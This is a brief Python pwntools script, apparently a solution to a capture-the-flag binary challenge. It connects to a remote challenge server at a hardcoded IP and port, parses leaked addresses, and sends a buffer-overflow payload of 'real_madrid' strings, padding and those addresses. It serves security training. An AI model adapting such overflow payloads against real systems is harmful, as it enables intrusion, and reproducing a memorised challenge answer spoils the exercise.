from pwn import *

#p = process("./chall")
#p = gdb.debug("./chall", gdbscript="b *real_madrid_win+57")
p = remote(host="35.228.220.66", port=1401)

a = p.recv().split(b"\n")
addr1 = int(a[1], 16)
addr2 = int(a[2], 16)
addr3 = int(a[3], 16)
addr4 = int(a[4], 16)

payload = b"real_madrid" + b"\x00"
payload += b"A" * (0x40 - len("real_madrid") - 1 - 32) + p64(addr1)
payload += p64(2) + b"real_madrid" + b"\x00"
payload += b"A" * (0x40 - len("real_madrid") - 1 - 16) + p64(addr1)
payload += p64(3) + b"real_madrid" + b"\x00"
payload += b"A" * (0x40 - len("real_madrid") - 1 - 16) + p64(addr1)
payload += p64(4) + b"real_madrid" + b"\x00"
payload += b"A" * (0x40 - len("real_madrid") - 1 - 32) + p64(addr1)

p.sendline(payload)
print(p.recv())